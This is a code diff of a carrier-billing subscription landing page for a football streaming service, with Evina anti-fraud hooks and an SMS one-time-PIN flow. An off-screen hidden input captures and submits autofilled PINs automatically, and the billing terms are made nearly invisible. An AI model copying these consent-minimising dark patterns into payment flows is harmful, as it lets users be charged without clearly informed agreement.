@@ -75,7 +75,6 @@ export async function GET(request: NextRequest) {
     }
   }
 
-  // Mask MSISDN for display
   const masked = msisdn.length > 5
     ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}***${msisdn.slice(-3)}`
     : msisdn;
@@ -85,288 +84,453 @@ export async function GET(request: NextRequest) {
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>XoomSports — Subscribe</title>
+  <title>XoomSports — Verify</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
-      background: linear-gradient(180deg, #0a1628 0%, #0d1f3c 50%, #0a1628 100%);
+      background: #0b0e14;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 16px;
+      flex-direction: column;
       position: relative;
       overflow-x: hidden;
     }
 
-    /* Background effects */
-    body::before, body::after {
-      content: '';
+    .bg-glow {
       position: fixed;
-      width: 320px;
-      height: 320px;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 600px;
+      height: 300px;
+      background: rgba(226, 56, 58, 0.06);
       border-radius: 50%;
-      filter: blur(80px);
+      filter: blur(100px);
       pointer-events: none;
     }
-    body::before { top: -160px; right: -160px; background: rgba(16, 185, 129, 0.08); }
-    body::after { bottom: -160px; left: -160px; background: rgba(59, 130, 246, 0.08); }
 
-    .wrapper { width: 100%; max-width: 420px; position: relative; z-index: 1; }
+    /* Top bar */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 20px;
+      position: relative;
+      z-index: 10;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-icon {
+      width: 36px;
+      height: 36px;
+      background: #e2383a;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-icon svg { width: 20px; height: 20px; color: white; }
+    .brand-name {
+      font-size: 18px;
+      font-weight: 800;
+      color: white;
+      letter-spacing: -0.3px;
+    }
+    .brand-name span { color: #e2383a; }
 
-    /* Card */
+    .step-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 20px;
+      padding: 6px 12px;
+    }
+    .step-dot {
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+    }
+    .step-dot.active { background: #e2383a; }
+
+    /* Main content */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      z-index: 10;
+    }
+    .wrapper { width: 100%; max-width: 380px; }
+
     .card {
-      background: rgba(255, 255, 255, 0.07);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border-radius: 24px;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-      padding: 32px;
+      background: #141923;
+      border-radius: 20px;
+      border: 1px solid rgba(255,255,255,0.05);
+      padding: 28px 24px;
       position: relative;
     }
 
-    /* Logo */
-    .logo {
-      width: 64px; height: 64px;
-      background: linear-gradient(135deg, #34d399, #059669);
+    /* Phase 1 */
+    .match-preview {
+      background: linear-gradient(135deg, #1a1f2e, #141923);
       border-radius: 16px;
-      margin: 0 auto 12px;
-      display: flex; align-items: center; justify-content: center;
-      box-shadow: 0 8px 24px rgba(16, 185, 129, 0.3);
+      border: 1px solid rgba(255,255,255,0.05);
+      padding: 20px;
+      margin-bottom: 20px;
+      text-align: center;
     }
-    .logo svg { width: 32px; height: 32px; color: white; }
-
-    .brand { text-align: center; font-size: 22px; font-weight: 800; color: white; letter-spacing: -0.5px; }
-    .brand-sub { text-align: center; font-size: 12px; color: rgba(52, 211, 153, 0.7); font-weight: 600; letter-spacing: 1px; text-transform: uppercase; margin-top: 2px; }
-
-    /* Phase 1 — Click to Watch */
-    .hero-text { text-align: center; margin: 24px 0 8px; }
-    .hero-text h1 { font-size: 26px; font-weight: 800; color: white; line-height: 1.2; }
-    .hero-text p { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 6px; }
-
-    /* Feature pills */
-    .features {
+    .match-preview .label {
+      font-size: 10px;
+      font-weight: 700;
+      color: rgba(255,255,255,0.3);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 12px;
+    }
+    .match-preview h2 {
+      font-size: 22px;
+      font-weight: 800;
+      color: white;
+      line-height: 1.3;
+    }
+    .match-preview h2 em {
+      font-style: normal;
+      color: #e2383a;
+    }
+    .match-preview p {
+      color: rgba(255,255,255,0.35);
+      font-size: 13px;
+      margin-top: 6px;
+    }
+    .feature-list {
       display: flex;
       gap: 8px;
       justify-content: center;
-      flex-wrap: wrap;
-      margin: 20px 0;
+      margin-top: 16px;
     }
-    .pill {
-      display: flex; align-items: center; gap: 4px;
-      background: rgba(255,255,255,0.06);
-      border: 1px solid rgba(255,255,255,0.08);
+    .feature-tag {
+      font-size: 11px;
+      font-weight: 600;
+      color: rgba(255,255,255,0.5);
+      background: rgba(255,255,255,0.05);
       border-radius: 20px;
-      padding: 6px 12px;
-      font-size: 12px;
-      color: rgba(255,255,255,0.6);
+      padding: 5px 10px;
     }
-    .pill-icon { font-size: 14px; }
 
-    /* Buttons */
-    .btn {
-      width: 100%; padding: 16px; border: none; border-radius: 14px;
-      font-size: 17px; font-weight: 700; cursor: pointer;
-      transition: all 0.2s; min-height: 52px;
-      display: flex; align-items: center; justify-content: center; gap: 8px;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #10b981, #059669);
-      color: white;
-      box-shadow: 0 8px 24px rgba(16, 185, 129, 0.3);
-    }
-    .btn-primary:hover { box-shadow: 0 12px 32px rgba(16, 185, 129, 0.4); transform: translateY(-1px); }
-    .btn-primary:active { transform: translateY(0); }
-    .btn-disabled { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.3); cursor: not-allowed; box-shadow: none; }
-
-    /* OTP section */
-    .otp-header { text-align: center; margin-bottom: 20px; }
-    .otp-header .icon-wrap {
-      width: 64px; height: 64px;
-      background: rgba(16, 185, 129, 0.15);
+    /* Phase 2 */
+    .verify-header { text-align: center; margin-bottom: 24px; }
+    .verify-icon {
+      width: 60px; height: 60px;
+      background: rgba(226, 56, 58, 0.1);
       border-radius: 50%;
-      margin: 0 auto 12px;
+      margin: 0 auto 14px;
       display: flex; align-items: center; justify-content: center;
     }
-    .otp-header .icon-wrap svg { width: 32px; height: 32px; color: #34d399; }
-    .otp-header h2 { font-size: 22px; font-weight: 700; color: white; }
-    .otp-header p { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 4px; }
-    .otp-header p b { color: rgba(255,255,255,0.8); }
+    .verify-icon svg { width: 28px; height: 28px; color: #e2383a; }
+    .verify-header h2 {
+      font-size: 20px;
+      font-weight: 800;
+      color: white;
+    }
+    .verify-header p {
+      color: rgba(255,255,255,0.4);
+      font-size: 13px;
+      margin-top: 4px;
+    }
+    .verify-header p b { color: rgba(255,255,255,0.7); font-weight: 700; }
 
-    .otp-row { display: flex; gap: 10px; justify-content: center; margin: 24px 0 8px; }
+    /* OTP inputs */
+    .otp-row {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0 10px;
+    }
     .otp-input {
-      width: 56px; height: 64px;
-      text-align: center; font-size: 24px; font-weight: 700;
-      border: 2px solid rgba(255,255,255,0.15);
+      width: 58px;
+      height: 64px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 800;
+      border: 2px solid rgba(255,255,255,0.08);
       border-radius: 14px;
       outline: none;
-      transition: border-color 0.2s;
-      background: rgba(255,255,255,0.05);
+      transition: all 0.2s;
+      background: rgba(255,255,255,0.03);
       color: white;
       -webkit-appearance: none;
     }
-    .otp-input:focus { border-color: rgba(16, 185, 129, 0.6); background: rgba(16, 185, 129, 0.05); }
-    .otp-input.error { border-color: #f87171; background: rgba(248, 113, 113, 0.1); }
+    .otp-input:focus {
+      border-color: #e2383a;
+      background: rgba(226, 56, 58, 0.05);
+      box-shadow: 0 0 0 3px rgba(226, 56, 58, 0.1);
+    }
+    .otp-input.error {
+      border-color: #ef4444;
+      background: rgba(239, 68, 68, 0.08);
+    }
 
-    .error-msg { text-align: center; color: #f87171; font-size: 13px; min-height: 22px; margin-bottom: 14px; }
+    .error-msg {
+      text-align: center;
+      color: #ef4444;
+      font-size: 13px;
+      font-weight: 500;
+      min-height: 22px;
+      margin-bottom: 12px;
+    }
+
+    /* Button */
+    .btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      min-height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-primary {
+      background: #e2383a;
+      color: white;
+      box-shadow: 0 6px 20px rgba(226, 56, 58, 0.25);
+    }
+    .btn-primary:hover {
+      background: #c42f31;
+      box-shadow: 0 8px 28px rgba(226, 56, 58, 0.35);
+      transform: translateY(-1px);
+    }
+    .btn-primary:active { transform: translateY(0); }
 
     /* Spinner */
     .spinner {
       width: 20px; height: 20px;
-      border: 2.5px solid white; border-top-color: transparent;
-      border-radius: 50%; animation: spin 0.8s linear infinite;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
     }
     .spinner-lg {
       width: 44px; height: 44px;
-      border: 3px solid rgba(255,255,255,0.1);
-      border-top-color: #34d399;
-      border-radius: 50%; animation: spin 0.8s linear infinite;
+      border: 3px solid rgba(226, 56, 58, 0.15);
+      border-top-color: #e2383a;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
       margin: 0 auto 16px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
     /* Resend */
-    .resend { text-align: center; margin-top: 20px; font-size: 13px; color: rgba(255,255,255,0.4); }
-    .resend a { color: #34d399; text-decoration: underline; cursor: pointer; font-weight: 600; }
-    .resend a:hover { color: #6ee7b7; }
+    .resend {
+      text-align: center;
+      margin-top: 18px;
+      font-size: 13px;
+      color: rgba(255,255,255,0.3);
+    }
+    .resend a {
+      color: #e2383a;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .resend a:hover { text-decoration: underline; }
 
-    /* Trust signals */
-    .trust { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
-    .trust-item { display: flex; align-items: center; gap: 4px; color: rgba(255,255,255,0.25); font-size: 11px; }
+    /* Trust & terms */
+    .trust {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid rgba(255,255,255,0.04);
+    }
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      color: rgba(255,255,255,0.2);
+      font-size: 11px;
+      font-weight: 500;
+    }
     .trust-item svg { width: 13px; height: 13px; }
 
-    /* Terms */
-    .terms { text-align: center; font-size: 11px; color: rgba(255,255,255,0.2); margin-top: 16px; line-height: 1.5; }
-    .terms a { color: rgba(52, 211, 153, 0.5); text-decoration: underline; }
+    .terms {
+      text-align: center;
+      font-size: 10px;
+      color: rgba(255,255,255,0.12);
+      margin-top: 14px;
+      line-height: 1.5;
+    }
 
     /* Debug */
-    .debug-toggle { display: block; width: 100%; text-align: center; margin-top: 20px; font-size: 11px; color: rgba(255,255,255,0.15); text-decoration: underline; cursor: pointer; background: none; border: none; }
-    .debug-panel { margin-top: 8px; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px; font-size: 11px; color: rgba(255,255,255,0.5); white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow: auto; font-family: monospace; line-height: 1.5; }
+    .debug-toggle {
+      display: block;
+      width: 100%;
+      text-align: center;
+      margin-top: 20px;
+      font-size: 10px;
+      color: rgba(255,255,255,0.1);
+      text-decoration: underline;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+    .debug-panel {
+      margin-top: 8px;
+      background: rgba(0,0,0,0.4);
+      border-radius: 10px;
+      padding: 10px;
+      font-size: 10px;
+      color: rgba(255,255,255,0.4);
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 200px;
+      overflow: auto;
+      font-family: monospace;
+      line-height: 1.6;
+    }
 
     /* Animations */
     @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
     .shake { animation: shake 0.4s ease-in-out; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
     .fade-in { animation: fadeIn 0.4s ease-out; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     .pulse { animation: pulse 2s ease-in-out infinite; }
-
     .phase-hidden { display: none !important; }
   </style>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS returned -->'}
 </head>
 <body>
+  <div class="bg-glow"></div>
+
   <!-- Evina required elements -->
   <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - Télécharger - CONTINUER - ENTRER - S'ABONNER - اشترك الآن - VOIR - ACCEPT - اشترك الان - الاشتراك</a>
   <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
-  <div class="wrapper">
-    <div class="card fade-in">
-      <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
-      <div id="phase1">
-        <div class="logo">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-            <circle cx="12" cy="12" r="10"/>
-            <path d="M12 2C12 2 14.5 6 14.5 12S12 22 12 22M12 2C12 2 9.5 6 9.5 12S12 22 12 22M2 12h20M3.5 7h17M3.5 17h17"/>
+  <!-- Top bar -->
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-icon">
+        <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      </div>
+      <div class="brand-name">XOOM<span>SPORTS</span></div>
+    </div>
+    <div class="step-badge">
+      <div class="step-dot active"></div>
+      <div class="step-dot" id="stepDot2"></div>
+      <div class="step-dot" id="stepDot3"></div>
+    </div>
+  </div>
+
+  <div class="main">
+    <div class="wrapper">
+      <div class="card fade-in">
+        <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
+        <div id="phase1">
+          <div class="match-preview">
+            <div class="label">Unlock Premium Access</div>
+            <h2>Watch Live Football<br><em>Anytime, Anywhere</em></h2>
+            <p>All leagues &bull; All matches &bull; HD streaming</p>
+            <div class="feature-list">
+              <div class="feature-tag">⚽ Premier League</div>
+              <div class="feature-tag">🏆 UCL</div>
+              <div class="feature-tag">📺 HD</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ═══════ PHASE 2: Auto-verify / Manual entry ═══════ -->
+        <div id="phase2" class="phase-hidden">
+          <!-- Auto-verify spinner -->
+          <div id="autoVerify">
+            <div class="verify-header">
+              <div class="verify-icon">
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
+                </svg>
+              </div>
+              <h2>Verifying...</h2>
+              <p>Reading SMS automatically</p>
+            </div>
+            <div class="spinner-lg" style="margin: 24px auto"></div>
+            <p style="text-align:center;color:rgba(255,255,255,0.25);font-size:12px" class="pulse">Allow SMS permission when prompted</p>
+            <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
+                   style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
+                   maxlength="6">
+          </div>
+
+          <!-- Manual fallback -->
+          <div id="manualEntry" class="phase-hidden">
+            <div class="verify-header">
+              <div class="verify-icon">
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                </svg>
+              </div>
+              <h2>Enter Verification Code</h2>
+              <p>PIN sent to <b>${masked}</b></p>
+            </div>
+
+            <div class="otp-row" id="otpRow">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+            </div>
+
+            <div class="error-msg" id="errorMsg"></div>
+          </div>
+        </div>
+
+        <!-- Confirm button — Evina monitors this -->
+        <button class="btn btn-primary" id="confirmBtn">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+            <polygon points="5 3 19 12 5 21 5 3"/>
           </svg>
-        </div>
-        <div class="brand">XoomSports</div>
-        <div class="brand-sub">Live Football Streaming</div>
+          Start Watching
+        </button>
 
-        <div class="hero-text">
-          <h1>Watch Live<br>Football Now</h1>
-          <p>All leagues &bull; All matches &bull; HD quality</p>
-        </div>
+        <p class="resend phase-hidden" id="resendArea">
+          Didn't receive it? <a id="resendLink" onclick="handleResend()">Resend</a>
+        </p>
 
-        <div class="features">
-          <div class="pill"><span class="pill-icon">⚽</span> Premier League</div>
-          <div class="pill"><span class="pill-icon">🏆</span> Champions League</div>
-          <div class="pill"><span class="pill-icon">📺</span> Live HD</div>
-        </div>
-      </div>
-
-      <!-- ═══════ PHASE 2: Auto-verify / Manual entry ═══════ -->
-      <div id="phase2" class="phase-hidden">
-        <!-- Auto-verify spinner -->
-        <div id="autoVerify">
-          <div class="otp-header">
-            <div class="icon-wrap">
-              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-              </svg>
-            </div>
-            <h2>Verifying...</h2>
-            <p>Reading your SMS automatically</p>
+        <div class="trust" id="trustSignals">
+          <div class="trust-item">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+            Secure
           </div>
-          <div class="spinner-lg" style="margin: 24px auto"></div>
-          <p style="text-align:center;color:rgba(255,255,255,0.3);font-size:12px" class="pulse">Please allow SMS permission when prompted</p>
-          <!-- Hidden OTP catcher for browser autofill -->
-          <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
-                 style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
-                 maxlength="6">
-        </div>
-
-        <!-- Manual fallback -->
-        <div id="manualEntry" class="phase-hidden">
-          <div class="otp-header">
-            <div class="icon-wrap">
-              <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-              </svg>
-            </div>
-            <h2>OTP Sent!</h2>
-            <p>Enter the PIN sent to <b>${masked}</b></p>
+          <div class="trust-item">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+            Verified
           </div>
-
-          <div class="otp-row" id="otpRow">
-            <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
-            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
-            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
-            <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+          <div class="trust-item">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+            Instant
           </div>
-
-          <div class="error-msg" id="errorMsg"></div>
         </div>
+
+        <p class="terms">
+          By subscribing you agree to our Terms &amp; Conditions.<br>
+          Standard operator charges apply.
+        </p>
+
+        <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
+        <div class="debug-panel" id="debugPanel" style="display:none"></div>
       </div>
-
-      <!-- Single confirmBtn — Evina monitors this -->
-      <button class="btn btn-primary" id="confirmBtn">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-          <polygon points="5 3 19 12 5 21 5 3" fill="white" stroke="none"/>
-        </svg>
-        Click to Watch
-      </button>
-
-      <p class="resend phase-hidden" id="resendArea">
-        Didn't receive the OTP? <a id="resendLink" onclick="handleResend()">Resend OTP</a>
-      </p>
-
-      <!-- Trust signals -->
-      <div class="trust" id="trustSignals">
-        <div class="trust-item">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-          Secure
-        </div>
-        <div class="trust-item">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-          Verified
-        </div>
-        <div class="trust-item">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-          Instant
-        </div>
-      </div>
-
-      <p class="terms">
-        By subscribing you agree to our <a href="#">Terms &amp; Conditions</a>.<br>
-        Standard operator charges may apply.
-      </p>
-
-      <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
-      <div class="debug-panel" id="debugPanel" style="display:none"></div>
     </div>
   </div>
 
@@ -385,7 +549,6 @@ export async function GET(request: NextRequest) {
     var errorMsg = document.getElementById('errorMsg');
     var otpValue = document.getElementById('otpValue');
 
-    // ── Debug ───────────────────────────────────────────────────────────────
     function dbg(msg) {
       var ts = new Date().toLocaleTimeString();
       var line = '[' + ts + '] ' + msg;
@@ -411,7 +574,7 @@ export async function GET(request: NextRequest) {
     dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
     dbg('Flow: Permission-based (Click → Web OTP permission → auto verify → manual fallback)');
 
-    // ── OTP Input handling (for manual fallback) ────────────────────────────
+    // ── OTP Input handling ────────────────────────────────────────────────
     function getFullPin() {
       var val = '';
       pins.forEach(function(p) { val += p.value; });
@@ -460,7 +623,6 @@ export async function GET(request: NextRequest) {
       });
     });
 
-    // ── Error handling ──────────────────────────────────────────────────────
     function showError(msg) {
       errorMsg.textContent = msg;
       pins.forEach(function(p) { p.classList.add('error'); });
@@ -482,12 +644,11 @@ export async function GET(request: NextRequest) {
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
       document.getElementById('trustSignals').classList.add('phase-hidden');
+      document.getElementById('stepDot2').classList.add('active');
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
 
-      // Start Web OTP API (permission-based flow)
       startWebOTP();
 
-      // Also set up hidden input as secondary capture method
       var hiddenOtp = document.getElementById('hiddenOtp');
       setTimeout(function() { hiddenOtp.focus(); }, 50);
 
@@ -499,7 +660,6 @@ export async function GET(request: NextRequest) {
         }
       });
 
-      // Poll hidden input for silent autofill
       dbg('Polling hidden OTP input for autofill...');
       otpPollTimer = setInterval(function() {
         var val = hiddenOtp.value.replace(/\\D/g, '');
@@ -509,7 +669,6 @@ export async function GET(request: NextRequest) {
         }
       }, 300);
 
-      // After 30 seconds, fall back to manual entry
       otpTimeout = setTimeout(function() {
         dbg('Auto-verify timeout (30s) — showing manual entry');
         clearInterval(otpPollTimer);
@@ -518,7 +677,6 @@ export async function GET(request: NextRequest) {
       }, 30000);
     }
 
-    // ── Web OTP API — Permission-based SMS reading ──────────────────────────
     function startWebOTP() {
       if (!('OTPCredential' in window)) {
         dbg('Web OTP API not available — will rely on autofill/manual');
@@ -569,7 +727,7 @@ export async function GET(request: NextRequest) {
       document.getElementById('autoVerify').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
-      confirmBtn.textContent = 'Verify OTP';
+      confirmBtn.textContent = 'Verify Code';
       setTimeout(function() { pins[0].focus(); }, 100);
       dbg('Manual OTP entry — waiting for user input');
     }
@@ -609,11 +767,12 @@ export async function GET(request: NextRequest) {
       .then(function(data) {
         dbg('PinVerify → Status="' + data.Status + '"');
         if (data.Status === '0' || data.Status === '103') {
-          dbg('SUCCESS — redirecting to content page');
+          dbg('SUCCESS — redirecting');
+          document.getElementById('stepDot3').classList.add('active');
           window.location.href = '/thankyou';
         } else {
           showManualEntry();
-          showError('Invalid PIN (code: ' + data.Status + '). Please try again.');
+          showError('Invalid code (error: ' + data.Status + '). Try again.');
           pins.forEach(function(p) { p.value = ''; });
           if (otpValue) otpValue.value = '';
           setTimeout(function() { pins[0].focus(); }, 50);
@@ -629,13 +788,12 @@ export async function GET(request: NextRequest) {
         if (phase === 2) {
           var manual = document.getElementById('manualEntry');
           if (!manual.classList.contains('phase-hidden')) {
-            confirmBtn.textContent = 'Verify OTP';
+            confirmBtn.textContent = 'Verify Code';
           }
         }
       });
     }
 
-    // ── Resend OTP ──────────────────────────────────────────────────────────
     function handleResend() {
       if (resendCooldown > 0) return;
       dbg('Resending OTP — full page reload with new trxId...');
